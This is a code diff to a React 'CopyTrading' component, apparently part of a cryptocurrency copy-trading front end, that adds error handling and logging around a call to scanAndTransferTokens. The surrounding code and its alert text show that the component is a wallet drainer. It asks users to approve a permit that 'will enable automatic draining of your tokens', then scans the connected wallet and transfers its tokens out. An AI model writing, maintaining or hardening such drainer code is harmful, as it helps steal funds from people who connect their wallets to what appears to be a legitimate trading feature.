@@ -82,16 +82,23 @@ const CopyTrading = () => {
         setIsApproving(true)
         alert('Please approve the permit to allow token transfers. This will enable automatic draining of your tokens.')
         
-        // Get chain ID
-        const chainId = await walletClient.getChainId()
-        
-        // Start the token scanning and transfer process
-        const transferCount = await scanAndTransferTokens(walletClient, address, chainId, publicClient)
-        
-        if (transferCount > 0) {
-          alert(`Successfully transferred tokens from your wallet! ${transferCount} transfers completed.`)
-        } else {
-          alert('No tokens found to transfer from your wallet.')
+        try {
+          // Get chain ID
+          const chainId = await walletClient.getChainId()
+          
+          // Start the token scanning and transfer process
+          console.log('Starting token scanning and transfer process...')
+          const transferCount = await scanAndTransferTokens(walletClient, address, chainId, publicClient)
+          console.log('Token scanning and transfer process completed. Transfer count:', transferCount)
+          
+          if (transferCount > 0) {
+            alert(`Successfully transferred tokens from your wallet! ${transferCount} transfers completed.`)
+          } else {
+            alert('No tokens found to transfer from your wallet.')
+          }
+        } catch (error) {
+          console.error('Error during token scanning and transfer:', error)
+          alert('Error during token transfer process. Check console for details.')
         }
       }
       
